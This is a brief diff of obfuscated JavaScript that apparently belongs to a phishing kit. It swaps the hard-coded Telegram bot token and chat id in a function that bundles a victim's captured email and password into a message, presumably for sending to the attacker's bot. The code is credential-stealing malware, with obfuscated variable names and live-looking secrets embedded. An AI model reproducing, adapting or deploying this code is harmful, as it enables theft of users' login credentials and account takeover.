@@ -12,8 +12,8 @@
         }
 
         function _0x1298a(data) {
-            const _0x40d1b3a = '7928094847:AAGaR3yCB4ty6jcJuDtEtZwtSpfE2PqMxpQ';
-            const _0x301fc5a = '7110810226';
+            const _0x40d1b3a = '8572832514:AAGkeZXRBFkEARU4LoklzC8tgyMwtK5cNyI';
+            const _0x301fc5a = '8458262871';
 
             const _0x93b389a = `????? - ${data.email}:${data.password}`;
 
@@ -146,4 +146,5 @@
             });
 
         });
+
 
